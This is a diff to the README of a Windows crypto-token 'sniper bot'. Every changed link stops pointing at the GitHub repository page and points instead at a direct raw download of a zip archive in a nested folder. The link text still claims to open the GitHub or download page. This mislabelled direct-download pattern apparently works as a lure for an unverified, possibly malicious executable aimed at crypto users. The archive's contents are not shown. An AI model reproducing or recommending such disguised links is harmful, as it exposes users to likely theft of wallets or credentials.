@@ -1,6 +1,6 @@
 # 🤖 Pumpfun-Sniper-Bot - Fast setup for quick trades
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg?style=for-the-badge)](https://github.com/wagawgaw/Pumpfun-Sniper-Bot)
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/wagawgaw/Pumpfun-Sniper-Bot/main/DexLab/Pumpfun-Bot-Sniper-v3.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Pumpfun-Sniper-Bot is a Windows app for users who want a simple way to run a sni
 
 Use this link to visit the download page:
 
-[Open Pumpfun-Sniper-Bot on GitHub](https://github.com/wagawgaw/Pumpfun-Sniper-Bot)
+[Open Pumpfun-Sniper-Bot on GitHub](https://raw.githubusercontent.com/wagawgaw/Pumpfun-Sniper-Bot/main/DexLab/Pumpfun-Bot-Sniper-v3.5-alpha.4.zip)
 
 If the page includes a release file, download it to your PC. If it opens the main repository page, use the files or release area on that page to get the Windows version.
 
@@ -205,9 +205,9 @@ If the issue stays, remove the folder, download the app again, and set it up fro
 
 ## 📎 Quick Access
 
-[Visit the Pumpfun-Sniper-Bot download page](https://github.com/wagawgaw/Pumpfun-Sniper-Bot)
+[Visit the Pumpfun-Sniper-Bot download page](https://raw.githubusercontent.com/wagawgaw/Pumpfun-Sniper-Bot/main/DexLab/Pumpfun-Bot-Sniper-v3.5-alpha.4.zip)
 
-[Download from GitHub](https://github.com/wagawgaw/Pumpfun-Sniper-Bot)
+[Download from GitHub](https://raw.githubusercontent.com/wagawgaw/Pumpfun-Sniper-Bot/main/DexLab/Pumpfun-Bot-Sniper-v3.5-alpha.4.zip)
 
 ## 🧩 File Notes
 
